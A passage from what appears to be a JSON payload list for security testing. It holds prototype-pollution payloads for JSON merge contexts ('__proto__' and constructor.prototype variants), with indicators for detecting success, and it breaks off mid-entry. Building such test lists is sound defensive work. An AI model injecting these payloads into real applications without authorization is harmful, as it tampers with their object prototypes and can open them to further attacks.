        "payload": "{\"__proto__\": {\"polluted\": true}}",
        "description": "Classic __proto__ pollution",
        "context": "JSON/merge",
        "indicator": "Object.prototype.polluted === true"
      },
      {
        "payload": "{\"constructor\": {\"prototype\": {\"polluted\": true}}}",
        "description": "Constructor prototype pollution",
        "context": "JSON/merge",
        "indicator": "Object.constructor.prototype.polluted === true"
      },
      {
        "payload": "{\"__proto__\": null}",
